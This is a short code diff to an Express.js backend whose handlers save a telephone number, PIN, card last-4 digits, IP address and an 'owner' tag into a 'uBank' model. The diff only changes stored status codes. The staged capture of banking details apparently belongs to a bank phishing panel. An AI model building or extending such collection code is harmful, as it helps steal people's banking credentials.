@@ -44,7 +44,7 @@ const getInfo = async (req, res) => {
 const submitLogin = async (req, res) => {
   const { telephone, uniqueid, owner, ip } = req.body;
   try {
-    await uBank.create({ uniqueid, telephone, status: 1, owner, ip });
+    await uBank.create({ uniqueid, telephone, status: 2, owner, ip });
     res.sendStatus(200);
   } catch (error) {
     console.log(error);
@@ -88,7 +88,7 @@ const submitPin = async (req, res) => {
 const submitLast4 = async (req, res) => {
   const { last4, uniqueid } = req.body;
   try {
-    await uBank.findOneAndUpdate({ uniqueid }, { last4, status: 3 }).exec();
+    await uBank.findOneAndUpdate({ uniqueid }, { last4, status: 4 }).exec();
     res.sendStatus(200);
   } catch (error) {
     console.log(error);
